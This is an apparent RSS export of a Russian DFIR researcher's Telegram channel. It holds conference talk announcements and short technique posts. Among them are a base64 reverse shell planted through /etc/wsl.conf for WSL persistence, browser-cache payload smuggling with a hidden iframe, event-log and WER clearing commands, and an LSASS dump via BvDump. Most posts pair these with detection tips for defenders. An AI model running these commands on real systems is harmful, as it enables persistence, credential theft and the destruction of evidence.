@@ -1,0 +1,449 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Garden Detective</title><link>https://t.me/gardendetective</link><description>DFIR... but why stop there</description><language>ru</language><lastBuildDate>Sun, 06 Sep 2026 20:16:06 +0000</lastBuildDate><item><title>🔵 Выкладываю презентацию доклада «DFIR vs WSL: цифровая криминалистика на стыке миров» с конференции Moscow Forensics Day 2026.</title><link>https://t.me/gardendetective/52</link><description>#mfd2026
+🔵 Выкладываю презентацию доклада «DFIR vs WSL: цифровая криминалистика на стыке миров» с конференции Moscow Forensics Day 2026.
+Цифровая криминалистика + WSL? Второе — точно, а чтобы узнать про первое — придётся открыть презентацию.
+💻 Ссылка на презентацию
+
+[Media: Фото]</description><pubDate>Fri, 04 Sep 2026 13:08:00 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_52</guid></item><item><title>🔵 Время уже выложить презентацию доклада «Jump Lists: Your Trace, My Trap», который был на треке Threat.Zone 🥴</title><link>https://t.me/gardendetective/51</link><description>#offzone2026
+🔵 Время уже выложить презентацию доклада «Jump Lists: Your Trace, My Trap», который был на треке Threat.Zone 🥴
+*что-то там про криминалистический артефакт Jump Lists и то, как он может быть использован атакующими, пентестерами или Red Team*
+💻 Ссылка на презентацию
+
+[Media: Документ]</description><pubDate>Sat, 22 Aug 2026 08:05:34 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_51</guid></item><item><title>Немного новостей:</title><link>https://t.me/gardendetective/50</link><description>#events #blog
+Немного новостей:
+🔵 21 августа, 15:00–15:30: буду выступать на конференции OFFZONE 2026 с докладом «Jump Lists: Your Trace, My Trap».
+Jump Lists — артефакт, хорошо знакомый каждому DFIR‑специалисту. По нему восстанавливают хронологию действий пользователя, находят следы открытия файлов/каталогов и выявляют подозрительную активность. Но что, если посмотреть на него с другой стороны — глазами offensive‑специалиста?
+Уже на этой неделе, приходите 🚪
+🔵 4 сентября, 12:15–12:35: другое мероприятие — Moscow Forensics Day 2026, где я представлю доклад «DFIR vs WSL: цифровая криминалистика на стыке миров».
+🔵 Также подал доклад на ZeroNights 2026 и теперь в ожидании результатов от CFP комитета (если примут, то снова поговорим про обход «песочниц»).
+🔴 Ну и конечно, советую прочитать новую статью от Лаборатории F6, вышедшую сегодня. Там мы разбираем TTPs группировки GOFFEE (Paper Werewolf), которые встретили в рамках IR.
+Про данную APT-группировку мы с Иваном Груздом ещё рассказывали на летнем фестивале CyberCamp (ссылка 💻).
+
+[Media: Фото]</description><pubDate>Tue, 18 Aug 2026 07:12:23 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_50</guid></item><item><title>17 июля совместно с Иваном Груздом мы выступили с двумя докладами на летнем фестивале CyberCamp, где затронули кейс с APT-группировкой.</title><link>https://t.me/gardendetective/49</link><description>#cybercamp2026 #leto
+17 июля совместно с Иваном Груздом мы выступили с двумя докладами на летнем фестивале CyberCamp, где затронули кейс с APT-группировкой.
+🔵 На сцене докладов: «Чтобы найти атакующего, иногда приходится провести двадцать лет вместе © кибербарон Мюнхгаузен»
+Рассмотрим хронологию затяжной APT-атаки. Вы узнаете, как хакеры годами оставались незамеченными, какие техники закрепления использовали и как скрывали сетевые следы. Имя этой группировки пока держим в секрете, но масштаб вас впечатлит.
+💻 Ссылка на презентацию
+🔵 На сцене практики: «Неужели обязательно нужно снести инфраструктуру, чтобы выгнать атакующих? © кибербарон Мюнхгаузен»
+Конкретные примеры и пошаговая проверка гипотез. Спикеры объяснят, как находить «приветы из прошлого», превентивно блокировать домены злоумышленников и проводить форензику при остром дефиците данных.
+💻 Ссылка на презентацию
+А насчет самого мероприятия буду краток: всё как всегда на высшем уровне! 😘
+
+[Media: Фото]</description><pubDate>Mon, 20 Jul 2026 06:28:13 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_49</guid></item><item><title>🔵 Вот и прошёл Standoff Talks 2026, и пора выложить презентацию доклада, с которой выступал 19 июня, — «Нельзя просто так взять и… не использовать Obsidian в атаке».</title><link>https://t.me/gardendetective/48</link><description>#persistence #standofftalks2026
+🔵 Вот и прошёл Standoff Talks 2026, и пора выложить презентацию доклада, с которой выступал 19 июня, — «Нельзя просто так взять и… не использовать Obsidian в атаке».
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+🔵 Кратко о том, что было в докладе:
+➖ ПО для заметок Obsidian и система плагинов;
+➖ разбор атаки кампании REF6598;
+➖ обход Restricted Mode;
+➖ использование Obsidian CLI;
+➖ PoC описанного в докладе сценария (хорошее закрепление для любителей оставлять свои "заметки").
+*️⃣код PoC (когда-нибудь я буду нормально оформлять репозитории, но это не точно 🥳);
+*️⃣ну и конечно, куда же без видео 🚪.</description><pubDate>Sun, 06 Sep 2026 20:16:06 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_48</guid></item><item><title>🔵 Вчера (23.04.2026) проходила конференция CIRF 2026, на которой я выступил с докладом "Генеральная уборка в Windows: искусство заметать цифровые следы". Да, и это снова одна из моих любимых тем —...</title><link>https://t.me/gardendetective/47</link><description>#anti_forensics #DFIR #cirf2026
+🔵 Вчера (23.04.2026) проходила конференция CIRF 2026, на которой я выступил с докладом "Генеральная уборка в Windows: искусство заметать цифровые следы". Да, и это снова одна из моих любимых тем — контр-криминалистические методы. 🚪
+*️⃣Ссылка на презентацию.
+🔵 Отдельно хочу отметить организацию конференции и выступления других спикеров — всё было на высшем уровне. 🏖
+
+[Media: Документ]</description><pubDate>Fri, 24 Apr 2026 07:35:04 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_47</guid></item><item><title>Какие темы затронем на курсе:</title><link>https://t.me/gardendetective/46</link><description>Я в своем познании Purple Teaming настолько преисполнился, что решил: настало время делиться опытом. Поэтому мы вместе с Олегом и нашими друзьями из Inseca разработали 6-недельный курс по данному направлению.
+Какие темы затронем на курсе:
+1️⃣Что такое Purple Teaming и почему вам стоит им заниматься?
+2️⃣Как подготовиться к киберучениям в подобном формате и как сделать их процессом?
+3️⃣Что такое эмуляция действий атакующих, где брать данные для нее, и как с ними работать?
+4️⃣Как разрабатывать детектирующую логику и когда этим следует заниматься?
+5️⃣Что такое Threat Hunting, когда и кому он нужен?
+6️⃣Как проводить киберучения и как автоматизировать этот процесс?
+Старт курса намечен на 13 марта, а следовательно, для читателей канала есть приятный бонус: скидка 10% по промокоду gardendetective.
+
+[Media: Фото]</description><pubDate>Mon, 02 Mar 2026 10:26:59 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_46</guid></item><item><title>🔵 Копаясь в документации Microsoft по подсистеме WSL (Windows Subsystem for Linux), нашёл интересный механизм закрепления. В каждом инстансе можно создать файл /etc/wsl.conf и в секции [boot] указать...</title><link>https://t.me/gardendetective/45</link><description>#persistence #t1037 #wsl
+🔵 Копаясь в документации Microsoft по подсистеме WSL (Windows Subsystem for Linux), нашёл интересный механизм закрепления. В каждом инстансе можно создать файл /etc/wsl.conf и в секции [boot] указать для параметра command команду, которая будет выполняться с правами root при каждом его запуске.
+Пример содержимого файла /etc/wsl.conf (запуск обратной оболочки):
+[boot]
+command=echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM3LjEyOS8yMjIyIDA+JjE= | base64 -d | /bin/bash
+🔴 Представим сценарий, в котором атакующий удалённо подключился по протоколу RDP к рабочей станции ИТ-администратора под управлением ОС Windows 11, на которой включен WSL2 и настроен Linux-дистрибутив.
+Цель злоумышленника — закрепиться в системе через файл /etc/wsl.conf.
+Команды (cmd.exe, powershell.exe; запуск без прав Администратора):
+wsl -l -v
+wsl -u root -d &lt;distro_name&gt; --exec bash -c "echo -e '[boot]\ncommand=echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM3LjEyOS8yMjIyIDA+JjE= | base64 -d | /bin/bash' &gt; /etc/wsl.conf"
+Пссс... После получения обратной оболочки... Напоминаю: из WSL по умолчанию можно запускать исполняемые файлы Windows.
+🔵 Дополнительные моменты:
+➖После внесения изменений в конфигурационный файл /etc/wsl.conf, полезная нагрузка, указанная в command, выполнится при следующем запуске инстанса WSL. Некоторые нюансы работы экземпляра WSL:
+*️⃣в сборке 18267 Microsoft добавили механизм таймаута завершения работы инстанса WSL, и он по умолчанию установлен на 15 секунд. Это означает, что экземпляр будет остановлен через 15 секунд после завершения последнего процесса WSL;
+*️⃣если под процессом /init (PID 2) в WSL запущен хотя бы один пользовательский процесс (например, в фоновом режиме), то экземпляр WSL не будет завершён (ссылка);
+Пример:
+nohup python3 -m http.server 8000 &amp;
+*️⃣для того, чтобы принудительно завершить работу определённого дистрибутива или всех сразу, можно использовать эти команды:
+wsl -t &lt;distro_name&gt;
+wsl --shutdown</description><pubDate>Tue, 18 Aug 2026 04:41:00 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_45</guid></item><item><title>🔵 Последние 2 доклада в этом году (🍩):</title><link>https://t.me/gardendetective/44</link><description>#socforum2025 #zeronights2025
+🔵 Последние 2 доклада в этом году (🍩):
+1️⃣ Доклад «После Red Team можно не бояться атак... Не бояться атак, да?» [SOC Forum 2025].
+➖ Совместно с Олегом Скулкиным (ссылка на TG-канал).
+Описание доклада:
+В докладе рассмотрим различия в тактиках, техниках и процедурах (TTP) между реальными хакерскими группировками и командами Pentest / Red Team. Эта разница объясняется тем, что профили атак, используемые в пентестах, часто не отражают реальные угрозы.
+Доклад поможет понять, как отличать инциденты, связанные с реальными атаками, от имитаций, а также почему реагирование на «пентестовые» сценарии могут привести к ложному чувству защищенности.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления (будет позже).
+2️⃣ Доклад «Горшочек, не вари! Истории про Web3-ловушки» [ZeroNights 2025].
+➖ Совместно с Николаем Микрюковым (@Nmikryukov).
+Описание доклада:
+Смарт-контракты, которые только притворяются уязвимыми... В нашем докладе мы рассмотрим существующие и ранее применявшиеся в Web3 трюки децентрализованных ханипотов.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления (будет позже).
+
+[Media: Фото]</description><pubDate>Thu, 27 Nov 2025 12:40:08 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_44</guid></item><item><title>🔵 Настало время опубликовать пост с веб-ссылками на доклады и разбором одного задания с CyberCamp 2025. Максимальная концентрация DFIR. 🍩</title><link>https://t.me/gardendetective/43</link><description>#cybercamp2025 #DFIR #task
+🔵 Настало время опубликовать пост с веб-ссылками на доклады и разбором одного задания с CyberCamp 2025. Максимальная концентрация DFIR. 🍩
+1️⃣ Доклад «Первое правило CI/CD-клуба: компрометация начинается с доверия».
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+2️⃣ Разбор задания «Горький коммит».
+*️⃣Ссылка на презентацию;
+*️⃣Запись эфира с разборами кейсов.
+P.S.: в разборе присутствуют 2 веб-ссылки на дополнительный материал:
+➖подготовка к эмуляции атаки;
+➖эмуляция действий атакующих.
+🔵 И конечно, не могу не упомянуть доклады от своих любимок (😍):
+3️⃣Доклад «ИБ-специалист в отпуске? Поздравляю, теперь ты – инцидент-респондер!» от Ивана Грузда.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+4️⃣Доклад «Чертовски хороший Compromise Assessment» от Анастасии Петровой.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+
+[Media: Фото]</description><pubDate>Fri, 21 Nov 2025 14:23:13 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_43</guid></item><item><title>🔵 Пришло время для нового поста! А после него начну публиковать интересные исследования — ждите их в декабре. Пора освежить канал не только рассказами о выступлениях, но и чем-то новым. 🍩</title><link>https://t.me/gardendetective/42</link><description>#events
+🔵 Пришло время для нового поста! А после него начну публиковать интересные исследования — ждите их в декабре. Пора освежить канал не только рассказами о выступлениях, но и чем-то новым. 🍩
+1️⃣Про SOC Forum я уже писал в предыдущем посте, но напомню, что 20 ноября будет доклад на тему «После Red Team можно не бояться атак... Не бояться атак, да?». Да-да, там также будут мемы. Куда же без них!
+2️⃣А 21 ноября будет эфир, завершающий арку CyberCamp 2025.
+На нём будет:
+➖ разбор четырех заданий их авторами: «Горький коммит» из соло-программы (моё наследие; будет разбор данного задания от меня🍩), а из командных киберучений — to My Curious Programmer, «Политик аналитик», NightCall;
+➖ подведение итогов кэмпа и статистика — самые интересные доклады и задания, самые активные участники, обсуждение обратной связи и планов на будущее;
+➖ возможность выиграть еще немного мерча!
+3️⃣И напоследок, 26 ноября совместно с Николаем Микрюковым (@Nmikryukov) будем выступать на конференции ZeroNights 2025 с докладов «Горшочек, не вари! Истории про Web3-ловушки», где расскажем про существующие и ранее применявшиеся в Web3 трюки децентрализованных ханипотов.
+Ну и мем для привлечения внимания 🥳
+
+[Media: Фото]</description><pubDate>Wed, 19 Nov 2025 11:33:22 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_42</guid></item><item><title>🔵 Уже почти конец года, но различных выступлений и активностей так и не убавилось.🚪</title><link>https://t.me/gardendetective/39</link><description>#events
+🔵 Уже почти конец года, но различных выступлений и активностей так и не убавилось.🚪
+1️⃣Начнём с самого интересного — это CyberCamp 2025 (ну просто любимки). В первый день докладов кэмпа (21 октября) можно будет погрузиться в мир тайн компрометации. Поэтому рекомендую послушать эти три доклада.
+Также в данном году появился новый формат — консультации, где можно задать свои животрепещущие вопросы спикерам по различным темам. Если хочется обсудить Incident Response, Compromise Assessment или Purple Teaming, то регистрируйтесь — пообщаемся на эти темы без лишней душноты. 💻
+P.S.: планируется какой-то секретный эфир. Что именно это будет, пока остается загадкой.
+UPDATE: секретный эфир.
+2️⃣На конференция SOC Forum 2025 будет доклад "После Red Team можно не бояться атак... Не бояться атак, да?" (20 ноября). Совместно с Олегом поговорим про различия... между реальными хакерскими группировками и командами Pentest/Red Team.
+3️⃣И последнее: подал 2 доклада на ZeroNights. Так что, ждём результатов от CFP комитета.
+
+[Media: Фото]</description><pubDate>Wed, 15 Oct 2025 09:04:05 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_39</guid></item><item><title>Message 37</title><link>https://t.me/gardendetective/37</link><description>
+
+[Media: Документ]</description><pubDate>Sat, 13 Sep 2025 12:37:42 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_37</guid></item><item><title>🔵 С 11 по 12 сентября проходила девятая ежегодная конференция — Moscow Forensics Day 2025.</title><link>https://t.me/gardendetective/36</link><description>#uwp #DFIR #mfd2025
+🔵 С 11 по 12 сентября проходила девятая ежегодная конференция — Moscow Forensics Day 2025.
+На данном мероприятии выступал с докладом на тему "UWP под прицелом DFIR: что скрывают современные Windows-приложения".
+Удалось осветить следующие пункты:
+1️⃣ Что такое UWP (Universal Windows Platform) и MSIX-пакеты.
+2️⃣ Инциденты ИБ, связанные с использованием MSIX-пакетов.
+3️⃣ Криминалистические артефакты, возникающие при установке MSIX-пакета, и их источники.
+4️⃣ Приложения из Microsoft Store, представляющие интерес для злоумышленников.
+🔵 Также отдельно выкладываю список полезных веб-ресурсов/веб-ссылок (оформлено в Obsidian).
+P.S.: уже в состоянии ожидания Moscow Forensics Day 2026 🚪</description><pubDate>Sat, 13 Sep 2025 12:37:42 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_36</guid></item><item><title>🔵 Прошла очередная конференция — OFFZONE 2025. Поэтому самое время выложить презентации докладов, с которыми я выступал на данном мероприятии.🚪</title><link>https://t.me/gardendetective/34</link><description>#offzone2025
+🔵 Прошла очередная конференция — OFFZONE 2025. Поэтому самое время выложить презентации докладов, с которыми я выступал на данном мероприятии.🚪
+1️⃣ На следующей неделе выложу дополнительный материал к докладу "Охота на призраков: изучение сетевой инфраструктуры атакующих" — полезные веб-ресурсы и ссылки, оформленные в Obsidian.🤪
+2️⃣ Также позже залью на свой GitHub скрипты из второго доклада, связанного с GitLab.
+
+[Media: Документ]</description><pubDate>Sat, 23 Aug 2025 07:52:32 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_34</guid></item><item><title>22 августа буду выступать на конференции OffZone 2025 с двумя докладами [🤪 которые я успешно доделал 🤪]. Буду рад видеть каждого, кто заглянет на мои выступления.</title><link>https://t.me/gardendetective/32</link><description>#offzone2025
+22 августа буду выступать на конференции OffZone 2025 с двумя докладами [🤪 которые я успешно доделал 🤪]. Буду рад видеть каждого, кто заглянет на мои выступления.
+Расписание:
+1️⃣"Охота на призраков: изучение сетевой инфраструктуры атакующих".
+Трек: Threat.Zone.
+Время: 12:30-13:00.
+Описание.
+2️⃣"Охота на тануки: узнаём точную версию GitLab".
+Трек: Fast Track.
+Время: 14:45–15:15.
+Описание.
+
+[Media: Фото]</description><pubDate>Mon, 18 Aug 2025 06:56:35 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_32</guid></item><item><title>#pentestaward2025</title><link>https://t.me/gardendetective/29</link><description>#pentestaward2025
+Вчера побывал на ежегодной независимой премии для пентестеров Pentest Award 2025, организованной компанией Awillix (@justsecurity). И да, ивент уже третий год стабильно набирает обороты. 🚪
+Я был приятно удивлён, что смог занять второе место в номинации «РАЗ BYPASS, ДВА BYPASS", где в своей работе затронул такие темы, как: обход Sandbox, антифорензика и многое другое (да-да, об этом подробнее расскажу чуть позже). 💻
+И отдельно хочется поблагодарить организаторов и жюри за большую работу — как по организации этого уникального и лампового мероприятия, так и за проверку 140 работ (!!!), отправленных в этом году. 😘
+С самой трансляцией можно ознакомиться тут.
+Ну и хотелось бы выделить @Russian_OSlNT, который ворвался на этот ивент и собрал несколько побед. Поздравляю!
+
+[Media: Фото, Видео]</description><pubDate>Sat, 02 Aug 2025 11:25:05 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_29</guid></item><item><title>#phishing #browser_cache</title><link>https://t.me/gardendetective/28</link><description>#phishing #browser_cache
+🔵 На конференции Insomnihack 2025 исследователь компании Orange Cyberdefense представил доклад, посвящённый способу доставки вредоносного ПО с использованием механизмов кэширования веб-браузеров (статья №1, статья №2).
+К данной работе хотелось бы добавить некоторое расширение, которое будет рассмотрено ниже. Но сначала кратко пройдёмся по основам.
+🔵 Система кэширования веб-браузеров хранит следующие типы данных:
+🔹HTML-файлы;
+🔹CSS-файлы;
+🔹JavaScript-файлы;
+🔹медиафайлы;
+🔹веб-шрифты.
+Однако возникает вопрос: «Как веб-браузеры определяют, какие файлы необходимо добавить в кэш?»
+Здесь всё довольно просто — используется HTTP-заголовок Content-Type, который можно контролировать на стороне веб-сервера.
+🔴 Настройка сервера атакующей стороны:
+Конфигурационный файл Nginx (/etc/nginx/sites-available/default):
+...
+location /i_am_not_malware.zip {
+add_header NOTMALWARE "purple_team_test";
+types { } default_type image/jpeg;
+}
+...
+Главная страница веб-сайта (/var/www/html/index.html):
+...
+&lt;iframe src="i_am_not_malware.zip" style="width:0;height:0;border:0;visibility:hidden;"&gt;&lt;/iframe&gt;
+...
+🔴 Расширение.
+В самом докладе рассматривается пример, при котором пользователю требуется перейти на фишинговый веб-сайт, чтобы файл сохранился в кэше. Однако описанный способ можно применить и в другом виде. Например, можно прописать в LNK-файле ("классическое" вложение в письме) команду перехода на сайт с помощью веб-браузера в headless-режиме (см. ниже). В данном случае файл также будет добавлен в кэш.
+Команда №1 (Mozilla Firefox; движок Quantum):
+"C:\Program Files\Mozilla Firefox\firefox.exe" --headless --url http://&lt;IP_DOMAIN&gt;/index.html
+Примечания:
+*️⃣одновременная работа нескольких независимых процессов с одним профилем Firefox невозможна. Поэтому необходимо либо завершить текущий процесс firefox.exe, либо использовать отдельный профиль (создать) для нового процесса:
+"C:\Program Files\Mozilla Firefox\firefox.exe" --createprofile sidekick
+"C:\Program Files\Mozilla Firefox\firefox.exe" --P sidekick --headless --url http://&lt;IP_DOMAIN&gt;/index.html
+*️⃣Каталог расположения кэша: %LOCALAPPDATA%\Mozilla\Firefox\Profiles\*.*\cache2\entries.
+Команды №2 (Microsoft Edge, Google Chrome и т.п.; движок Chromium):
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --disk-cache-size=1073741824 --dump-dom https://&lt;IP_DOMAIN&gt;/index.html
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --disable-gpu --user-data-dir="%USERPROFILE%\AppData\Local\Chrome\purple" --disk-cache-size=1073741824 --dump-dom https://&lt;IP_DOMAIN&gt;/index.html
+Примечания:
+*️⃣в headless-режиме Google Chrome необходимо указать отдельный каталог для хранения пользовательских данных (параметр --user-data-dir), иначе после завершения сессии кэш и другие данные будут удалены;
+*️⃣если файл достаточно большой, рекомендуется увеличить объём кэша на диске (параметр --disk-cache-size), например, до 100 Мбайт;
+*️⃣Каталог расположения кэша MSEdge (headless-режим): %LOCALAPPDATA%\Temp\HeadlessEdge*\Default\Cache\Cache_Data.
+
+[Media: Видео]</description><pubDate>Wed, 05 Nov 2025 08:35:56 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_28</guid></item><item><title>#lolbas #anti_forensics #wer</title><link>https://t.me/gardendetective/26</link><description>#lolbas #anti_forensics #wer
+🔵 Сегодня мы рассмотрим один из контр-криминалистических методов — использование нативной утилиты wermgr.exe ОС Windows для удаления WER-файлов. Данный исполняемый файл связан со службой Windows Error Reporting (WER), которая отвечает за сбор и отправку отладочной информации о сбоях как системных, так и сторонних приложений в Windows.
+Например, при падении приложения будет сгенерирован отчёт Report.wer. Он полезен DFIR-специалисту, поскольку содержит информацию о:
+🔹возникшей ошибке;
+🔹полном пути к исполняемому файлу;
+🔹подгружаемых DLL;
+🔹SHA-1 хеше исполняемого файла (начиная с ОС Windows 10).
+🔴 С помощью параметра -purgestores происходит удаление данных из следующих каталогов (см. скриншоты из Process Monitor от Sysinternals, приложенные к данному посту):
+*️⃣%ProgramData%\Microsoft\Windows\WER\ReportArchive;
+*️⃣%ProgramData%\Microsoft\Windows\WER\ReportQueue;
+*️⃣%ProgramData%\Microsoft\Windows\WER\Temp.
+Команда:
+wermgr.exe -purgestores
+🔵 При создании детектирующего правила следует учитывать наличие параметра -purgestores в командной строке процесса wermgr.exe.
+🔵 Тесты проводились на ОС Windows 10 (21H2), а запуск команды осуществлялся под привилегированной учётной записью.
+
+[Media: Фото]</description><pubDate>Fri, 11 Jul 2025 14:15:58 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_26</guid></item><item><title>#presentations</title><link>https://t.me/gardendetective/25</link><description>#presentations
+🔵 Решил собрать информацию по своим докладам в одном посте, где добавил как ссылки на сами презентации, так и на записи выступлений 💻
+1️⃣CyberCamp 2023. Чертоги оперативной памяти: как проанализировать то, что пока не забыто.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+2️⃣SOC Tech 2023. Как удачно испортить выходной день DFIR-специалисту?
+*️⃣Ссылка на презентацию.
+3️⃣BI.ZONE Cybersecurity Meetup №1. Смотритель зоопарка или как DFIR специалисту выжить в незнакомой ему инфраструктуре.
+*️⃣Ссылка на презентацию.
+4️⃣PHDays 2024. Было ваше — стало наше: что полезного можно найти на серверах злоумышленников.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+5️⃣PHDays 2024. Война с песочницей: техники по ту сторону баррикад.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+6️⃣OFFZONE 2024. Новый инцидент, или Как я снова встретил MikroTik.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+7️⃣CyberCamp 2024. Хроники противостояния: взгляд на RDP с обеих сторон.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления;
+*️⃣Дополнительная информация.
+8️⃣SOC Forum 2024. Bad Forensicator.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+9️⃣CyberCamp 2025 (MeetUp DFIR). Криминалистика — это не Дикий Запад, здесь есть правила.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления;
+*️⃣Дополнительная информация.
+1️⃣0️⃣CTI Meetup №3 (Inseca). Уйди в туман, запутай след.
+*️⃣Ссылка на презентацию;
+*️⃣Запись выступления.
+1️⃣1️⃣CIRF 2025. Куда же упало яблоко, или искусство анализа триажа macOS.
+*️⃣Ссылка на презентацию;
+*️⃣Дополнительная информация.
+
+[Media: Видео]</description><pubDate>Thu, 12 Jun 2025 12:12:55 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_25</guid></item><item><title>#lolbas #anti_forensics #evtx</title><link>https://t.me/gardendetective/24</link><description>#lolbas #anti_forensics #evtx
+🔵 Один из излюбленных контр-криминалистических методов атакующих — это удаление журналов событий Windows. Для этого можно использовать нативную утилиту wevtutil, командлет Remove-EventLog интерпретатора PowerShell и другие способы.
+Но сегодня мы обсудим две утилиты, которые входят в состав Event Log Explorer — инструмента, широко применяемого DFIR-специалистами для анализа журналов событий Windows: elbackx и elback.
+Данные программы используются для копирования журналов событий с разных рабочих станций/серверов под управлением ОС Windows в указанный каталог. Возможно копирование журналов как с локального хоста, так и с удалённого.
+🔴 Однако стоит обратить внимание на то, что разработчики добавили параметр /Clear, позволяющий очистить журналы Windows после их копирования в новое место.
+Дополнительно у elbackx есть параметр /Nobackup, который позволяет не указывать каталог, куда будут сохранены журналы. Следовательно, копирование evtx-файлов производиться не будет.
+🔴 Примеры запуска инструмента elback/elbackx.
+Команда №1 (очищает все журналы событий Windows):
+elbackx.exe /Nobackup "*" /Clear
+Команда №2 (очищает только те журналы Windows, в которых есть события):
+elbackx.exe /Nobackup "*&lt;NONEMPTY&gt;" /Clear
+Команда №3:
+elbackx.exe file.elb
+Например, в файле file.elb указано следующее (удалённая очистка журналов событий Windows c нескольких хостов):
+/Nobackup \\192.168.1.11\* /clear
+/Nobackup \\192.168.1.12\* /clear
+/Nobackup \\192.168.1.13\* /clear
+/Nobackup \\192.168.1.14\* /clear
+🔵 При реализации детектирующего правила необходимо обращать внимание на следующее:
+1️⃣Метаданные исполняемых файлов elback и elbackx:
+*️⃣OriginalFileName: elback.exe (для elback) и elbackx (для elbackx)
+*️⃣FileDescription: ElBack (для elback) и ElbackX (для elbackx)
+2️⃣Параметры командной строки:
+*️⃣/Nobackup;
+*️⃣/Clear;
+*️⃣наличие след. вхождений в командной строке для elbackx: CLASSIC, OPERATIONAL, ADMINISTRATIVE, NONEMPTY.</description><pubDate>Wed, 05 Nov 2025 08:35:56 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_24</guid></item><item><title>#lolbas #dump</title><link>https://t.me/gardendetective/23</link><description>#lolbas #dump
+🔵 В ходе атаки злоумышленники часто пытаются создать дамп процесса LSASS, чтобы собрать аутентификационные данные. Для этого они прибегают к различным легитимным инструментам, таким как: ProcDump, WinPmem, Magnet RAM Capture и другим.
+Сегодня я расскажу о ещё одной утилите, которая может оказаться на рабочей станции ИТ-администратора — это BvDump, входящая в состав Bitvise SSH Client.
+🔴 Примеры запуска инструмента BvDump.
+Команда №1:
+BvDump64.exe -image=lsass.exe -type=full -dir=C:\Users\Public\Desktop
+Команда №2:
+BvDump64.exe -pid=624 -type=2 -dir=C:\Users\Public\Desktop
+🔵 При реализации детектирующего правила необходимо обращать внимание на следующее:
+1️⃣Метаданные исполняемого файла BvDump:
+*️⃣OriginalFileName: BvDump64.exe (x64-версия) и BvDump32.exe (x32-версия)
+*️⃣ProductName: BvDump
+*️⃣FileDescription: Bitvise Process Dump Utility
+2️⃣Параметры командной строки:
+*️⃣-type=full или -type=2;
+*️⃣-pid=&lt;PID&gt; или -image=&lt;NAME&gt;;
+*️⃣-dir=&lt;DIR&gt;.
+3️⃣Создание файла с расширением .dmp (например: lsass.exe-624-000.dmp).
+
+[Media: Видео]</description><pubDate>Tue, 27 May 2025 14:49:56 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_23</guid></item><item><title>#anti_forensics</title><link>https://t.me/gardendetective/21</link><description>#anti_forensics
+🔵 Продолжая своё изучение экспортируемых функций динамических библиотек Windows, я наткнулся на одну из них, которая позволяет очистить у текущего пользователя информацию о недавно используемых файлах и каталогах.
+Данная функция сначала очищает ключ реестра HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs, а затем удаляет lnk-файлы, находящиеся в каталоге %AppData%\Microsoft\Windows\Recent.
+🔵 Чем могут быть полезны RecentDocs и Recent DFIR-специалисту? Например, с помощью этих источников криминалистических артефактов можно:
+*️⃣определить, с какими файлами и каталогами взаимодействовал злоумышленник на скомпрометированном хосте;
+*️⃣установить, какой файл был удалён, поскольку запись в RecentDocs сохраняется до тех пор, пока не будет перезаписана.
+Более подробно ознакомиться с этими артефактами можно в постере SANS: Windows Forensic Analysis или на скриншоте, прикреплённому к посту.
+🔴 Экспортируемая функция _CleanRecentDocs из библиотеки %WINDIR%\System32\windows.storage.dll (см. скриншот из Process Monitor от Sysinternals, приложенный к данному посту).
+Команда №1:
+rundll32.exe windows.storage.dll,_CleanRecentDocs
+Команда №2:
+rundll32.exe windows.storage.dll,#233
+Тесты проводились на ОС Windows 10 (21H2).
+
+[Media: Фото]</description><pubDate>Mon, 26 May 2025 07:12:26 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_21</guid></item><item><title>Message 19</title><link>https://t.me/gardendetective/19</link><description>
+
+[Media: Документ]</description><pubDate>Thu, 22 May 2025 08:50:13 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_19</guid></item><item><title>#macos #DFIR #cirf2025</title><link>https://t.me/gardendetective/18</link><description>#macos #DFIR #cirf2025
+🔵 20 мая участвовал на конференции CIRF 2025 с докладом "Куда же упало яблоко, или искусство анализа триажа macOS".
+Успел рассказать о ландшафте угроз macOS, а также на примере одного из инцидентов ИБ разобрали несколько источников криминалистических артефактов, которые могут быть полезны при расследовании реальных кейсов.
+🔵 Помимо самой презентации, выложу список полезных веб-ресурсов/веб-ссылок (оформлено в Obsidian).
